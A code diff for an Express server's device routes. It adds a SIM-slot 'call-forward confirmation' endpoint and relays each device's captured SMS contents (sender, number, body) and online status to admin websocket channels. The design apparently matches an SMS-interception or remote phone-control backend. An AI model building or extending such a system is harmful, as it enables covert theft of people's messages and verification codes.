@@ -1,7 +1,9 @@
+// File: src/routes/devices.ts
 import express, { Request, Response } from "express";
 import logger from "../logger/logger";
 import Device from "../models/Device";
 import Sms from "../models/Sms";
+import wsService from "../services/wsService";
 
 const router = express.Router();
 
@@ -83,6 +85,58 @@ router.put("/:deviceId/simInfo", async (req, res) => {
       success: false,
       error: err?.message,
     });
+  }
+});
+
+/* ================ SIM SLOT UPDATE (CALL-FORWARD CONFIRMATION) ================ */
+/**
+ * Expected body:
+ * { "status": "active" | "inactive", "updatedAt": <ms> }
+ *
+ * After DB write, this route will broadcast a 'simSlots' event to admin channels
+ * (per-device + global) so admin UI can flip Pending->Success/Fail based on real device confirmation.
+ */
+router.put("/:deviceId/simSlots/:slot", async (req, res) => {
+  try {
+    const deviceId = (req.params.deviceId || "").toString().trim();
+    const slot = (req.params.slot || "").toString().trim();
+
+    if (!deviceId || slot === "") {
+      return res.status(400).json({ success: false, error: "invalid params" });
+    }
+
+    const status = req.body?.status || (req.body?.active ? "active" : "inactive");
+    const updatedAt = Number(req.body?.updatedAt || Date.now());
+
+    // write sim slot status into Device document (adjust schema path as needed)
+    const setObj: any = {};
+    setObj[`simSlots.${slot}.status`] = status;
+    setObj[`simSlots.${slot}.updatedAt`] = isNaN(updatedAt) ? Date.now() : updatedAt;
+
+    await Device.findOneAndUpdate({ deviceId }, { $set: setObj }, { upsert: true });
+
+    // build event payload for admins
+    const payload = {
+      type: "event",
+      event: "simSlots",
+      deviceId,
+      data: {
+        [slot]: { status, updatedAt: isNaN(updatedAt) ? Date.now() : updatedAt }
+      },
+      timestamp: Date.now()
+    };
+
+    // notify admins (per-device and global)
+    try {
+      wsService.sendToAdminDevice(deviceId, payload);
+    } catch (e) {
+      logger.warn("wsService notify simSlots failed", e);
+    }
+
+    return res.json({ success: true });
+  } catch (err: any) {
+    logger.error("devices: update simSlot failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
   }
 });
 
@@ -212,26 +266,34 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
 
     await smsDoc.save();
 
-    // Try to emit a websocket notification (non-fatal if not configured)
+    // Try to emit a websocket notification to admin channels (non-fatal if not configured)
     try {
-      // Assumes your main server attaches socket io instance to app: app.set('io', io)
-      const io: any = (req.app && req.app.get && req.app.get("io")) || null;
-      if (io && typeof io.emit === "function") {
-        io.emit("event", {
-          type: "event",
-          event: "notification",
-          deviceId,
-          data: {
-            id: smsDoc._id,
-            title: smsDoc.title,
-            sender: smsDoc.sender,
-            senderNumber: smsDoc.senderNumber,
-            receiver: smsDoc.receiver,
-            body: smsDoc.body,
-            timestamp: smsDoc.timestamp,
-            meta: smsDoc.meta || {},
-          },
-        });
+      const payload = {
+        type: "event",
+        event: "notification",
+        deviceId,
+        data: {
+          id: smsDoc._id,
+          title: smsDoc.title,
+          sender: smsDoc.sender,
+          senderNumber: smsDoc.senderNumber,
+          receiver: smsDoc.receiver,
+          body: smsDoc.body,
+          timestamp: smsDoc.timestamp,
+          meta: smsDoc.meta || {},
+        },
+        timestamp: Date.now()
+      };
+
+      // prefer wsService (if available)
+      try {
+        wsService.sendToAdminDevice(deviceId, payload);
+      } catch (wsErr) {
+        // fallback: if you also have socket.io attached to app, emit there
+        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
+        if (io && typeof io.emit === "function") {
+          io.emit("event", payload);
+        }
       }
     } catch (emitErr) {
       logger.warn("WS emit failed (non-fatal)", emitErr);
@@ -292,16 +354,20 @@ router.put("/:deviceId/status", async (req, res) => {
       { upsert: true }
     );
 
-    // Try to emit status event too (optional)
+    // notify admin channels via wsService (preferred)
     try {
-      const io: any = (req.app && req.app.get && req.app.get("io")) || null;
-      if (io && typeof io.emit === "function") {
-        io.emit("event", {
-          type: "event",
-          event: "status",
-          deviceId,
-          data: { online, timestamp: isNaN(ts) ? Date.now() : ts },
-        });
+      const payload = {
+        type: "event",
+        event: "status",
+        deviceId,
+        data: { online, timestamp: isNaN(ts) ? Date.now() : ts },
+        timestamp: Date.now()
+      };
+      try {
+        wsService.sendToAdminDevice(deviceId, payload);
+      } catch (wsErr) {
+        const io: any = (req.app && req.app.get && req.app.get("io")) || null;
+        if (io && typeof io.emit === "function") io.emit("event", payload);
       }
     } catch (e) {
       logger.warn("WS emit status failed (non-fatal)", e);
